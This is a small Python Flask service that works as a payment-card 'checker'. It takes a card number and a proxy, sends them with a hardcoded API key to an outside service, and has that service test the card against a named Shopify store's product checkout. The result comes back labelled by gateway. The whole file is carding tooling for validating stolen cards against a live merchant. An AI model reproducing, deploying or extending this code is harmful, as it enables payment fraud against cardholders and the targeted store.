import os
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)
BARRYX_API = "https://api.barryxapi.xyz/shopify_graphql"
API_KEY    = "BRY-KESNP-TUPWH-JFOT9"

@app.route("/check", methods=["GET"])
def check():
    cc    = request.args.get("cc")
    proxy = request.args.get("proxy", "")
    site  = "https://shop.wedsociety.com/products/2026-wed-society®-indianapolis-book-of-weddings-digital-issue"

    payload = {"key": API_KEY, "card": cc, "product_url": site, "proxy": proxy}
    try:
        resp = requests.post(BARRYX_API, json=payload, timeout=30)
        data = resp.json()
        return jsonify({
            "Response": data.get("message", "Unknown"),
            "Price": data.get("price", "-"),
            "Gate": data.get("gateway", "Shopify")
        })
    except Exception as e:
        return jsonify({
            "Response": f"Error: {str(e)[:100]}",
            "Price": "-",
            "Gate": "Shopify"
        })

@app.route("/health")
def health():
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
